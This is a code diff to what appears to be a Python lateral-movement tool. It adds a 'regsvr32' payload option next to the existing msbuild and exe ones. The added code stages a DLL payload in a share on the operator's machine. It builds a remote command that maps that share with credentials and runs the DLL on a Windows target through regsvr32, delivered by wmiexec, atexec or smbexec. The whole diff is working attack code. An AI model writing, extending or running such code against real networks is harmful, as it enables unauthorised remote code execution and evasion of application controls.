@@ -770,6 +770,18 @@ def gen_payload_exe(share_name, payload_name, addresses_array):
             f.write(addr + "\n")
         f.close()
 
+def gen_payload_regsvr32(share_name, payload_name, addresses_array):
+    addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+
+    os.system('sudo cp {}/src/regsvr32payload /var/tmp/{}/{}.dll'.format(cwd, share_name, payload_name))
+    os.system('chmod +rx /var/tmp/{}/{}.dll'.format(share_name, payload_name))
+
+    with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
+        for addr in addresses_array:
+            f.write(addr + "\n")
+        f.close()
+
+    return addresses_file
 
 def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array):
     targetname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
@@ -1208,7 +1220,7 @@ if __name__ == '__main__':
     parser.add_argument('-threads', action='store', type = int, default = 5,help='Set the maximum number of threads default=5')
     parser.add_argument('-timeout', action='store', type=int, default=90, help='Set the timeout in seconds for each thread default=90')
     parser.add_argument('-method', action='store', default='wmiexec', choices=['wmiexec', 'atexec', 'smbexec'], help='Choose a method to execute the commands')
-    parser.add_argument('-payload', '-p', action='store', default='msbuild', choices=['msbuild', 'exe'], help='Choose a payload type')
+    parser.add_argument('-payload', '-p', action='store', default='msbuild', choices=['msbuild', 'regsvr32', 'exe'], help='Choose a payload type')
     parser.add_argument('-ip', action='store', help='Your local ip or network interface for the remote device to connect to')
     parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                        '"%s"). If errors are detected, run chcp.com at the target, '
@@ -1350,6 +1362,8 @@ if __name__ == '__main__':
 
         if options.payload == 'msbuild':
             gen_payload_msbuild(share_name, payload_name, drive_letter, addresses) # creates the payload
+        elif options.payload == 'regsvr32':
+            addresses_file = gen_payload_regsvr32(share_name, payload_name, addresses)
         elif options.payload == 'exe':
             gen_payload_exe(share_name, payload_name, addresses)
 
@@ -1357,6 +1371,8 @@ if __name__ == '__main__':
         print("\n[This is where the fun begins]\n{} Executing payload via {}\n".format(green_plus, options.method))
         if options.payload == 'msbuild':
             command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
+        elif options.payload == 'regsvr32':
+            command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\System32\regsvr32.exe /s /i:{},{}.txt {}:\{}.dll && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, addresses_file, drive_letter, payload_name, drive_letter)
         elif options.payload == 'exe':
             command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\{}.exe && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
 
